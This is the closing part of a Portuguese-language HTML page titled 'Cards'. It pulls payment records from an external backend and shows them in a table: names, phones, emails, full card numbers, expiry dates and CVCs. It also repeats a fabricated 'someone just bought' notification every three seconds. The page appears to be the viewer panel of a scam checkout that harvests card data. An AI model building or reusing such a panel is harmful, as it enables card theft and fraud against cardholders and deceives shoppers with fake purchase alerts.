    <title>Cards</title>
</head>
<body>
  <section id="contact" class="contact section">
      <!-- Section Title -->
      <div class="container section-title">
        <h2>Pagamentos <i class="fa fa-credit"></i></h2>
      </div><!-- End Section Title -->
      
      <div class="container">
        <div class="row">
          <div class="col-lg-12 container">
            <div class="contact-form-wrapper">
              <table id="table" class="table table-striped">
                  <thead>
                      <tr>
                          <th>Nome</th>
                          <th>Sobrenome</th>
                          <th>Telefone</th>
                          <th>Email</th>
                          <th>País</th>
                          <th>Validade</th>
                          <th>Nome no Cartão</th>
                          <th>Número do Cartão</th>
                          <th>CVC</th>
                      </tr>
                  </thead>
                  <tbody>
                  </tbody>
              </table>
            </div>
          </div>
        </div>
      </div>
    </section>
    <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
  <script src="/assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
  <script src="/assets/vendor/aos/aos.js"></script>
  <script src="/assets/vendor/purecounter/purecounter_vanilla.js"></script>
  <script src="/assets/vendor/swiper/swiper-bundle.min.js"></script>
  <script src="https://cdn.datatables.net/1.13.6/js/jquery.dataTables.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
  <script>
     toastr.options = {
      "closeButton": true,  
      "progressBar": true,
      "positionClass": "toast-bottom-right",
      "timeOut": "3000",
      "extendedTimeOut": "1000", 
      "showEasing": "swing",
      "hideEasing": "linear",
    };

    
    function showToast() {
      toastr.info('Hasdary acabou de comprar!');
    }

    setInterval(showToast, 3000); 
    
      $(document).ready(function () {
          $('#table').DataTable();
      });

      
      $(document).ready(function () {
    $.ajax({
      url: 'https://checkout-back.onrender.com/api/payments',
      method: 'GET',
      dataType: 'json',
      success: function (data) {
        console.log('Dados recebidos:', data); // Verifique no console

        $('#table').DataTable({
          destroy: true, // se a tabela já foi inicializada antes
          data: data,
          columns: [
            { data: 'firstName', title: 'Nome' },
            { data: 'lastName', title: 'Sobrenome' },
            { data: 'number', title: 'Telefone' },
            { data: 'email', title: 'Email' },
            { data: 'country', title: 'País' },
            {
              data: null,
              title: 'Validade',
              render: function (data, type, row) {
                return `${row.mm}/${row.yy}`;
              }
            },
            { data: 'cardName', title: 'Nome no Cartão' },
            { data: 'cardNumber', title: 'Número do Cartão' },
            { data: 'cvc', title: 'CVC' }
          ],
          language: {
            url: '//cdn.datatables.net/plug-ins/1.13.6/i18n/pt-BR.json'
          }
        });
      },
      error: function (err) {
        console.error('Erro ao carregar os dados:', err);
      }
    });
  });
  </script>
  <!-- Main JS File -->
</body>
</html>
